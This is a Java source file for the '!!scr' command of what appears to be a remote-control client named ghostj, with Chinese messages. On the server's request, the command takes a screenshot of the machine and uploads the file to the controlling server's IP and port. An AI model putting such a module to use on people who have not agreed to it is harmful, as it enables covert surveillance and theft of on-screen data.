package com.ghostj.client.func;

import com.ghostj.client.cmd.AbstractFunc;
import com.ghostj.client.cmd.AbstractProcessor;
import com.ghostj.client.conn.HandleConn;
import com.ghostj.client.core.ClientMain;
import com.ghostj.client.util.PrtScreen;
import com.rft.core.client.FileSender;

import java.io.File;
import java.util.Date;

import static com.ghostj.client.conn.HandleConn.writeToServer;

public class FuncPrtScr implements AbstractFunc {
	@Override
	public String getFuncName() {
		return "!!scr";
	}

	@Override
	public String[] getParamsModel() {
		return new String[]{"[picFile]"};
	}

	@Override
	public String getDescription() {
		return "截图，可选择保存到的文件";
	}

	@Override
	public int getMinParamsAmount() {
		return 0;
	}

	@Override
	public void run(String[] params, String cmd, AbstractProcessor processor) {

		String param="scr.png";
		if(params.length>=1)
			param=params[0];
		else
			param="scr.png";
		//rate
		double rate=1;
		if(params.length>=2){
			try{
				rate=Double.parseDouble(params[1]);
			}catch (Exception e){
				throw new IllegalArgumentException("rate只能为小于1的浮点数");
			}
		}

		try {
			String finalParam = param;
			double finalRate = rate;
			Thread t=new Thread(() -> {
				try {
					writeToServer("正在创建屏幕截图\n");
					PrtScreen.saveScreen(finalRate,finalParam);
					writeToServer("成功将截图保存到 " + finalParam + "\n");
				} catch (Exception e) {
					writeToServer("获取屏幕截图失败:" + ClientMain.getErrorInfo(e)+"\n");
				}
				try {
					//发送到服务器
					FileSender.sendFile(new File(finalParam), "prtscr/"+ ClientMain.name, "prtscr" + new Date().getTime(), HandleConn.ip, HandleConn.rft_port);
				}catch (Exception e){
					writeToServer("无法将截图上传至服务器"+"\n");
				}
			});
			t.start();
		}catch (Exception e){
			writeToServer("获取屏幕截图失败:" + ClientMain.getErrorInfo(e)+"\n");
		}
		HandleConn.sendFinishToServer();
	}
}
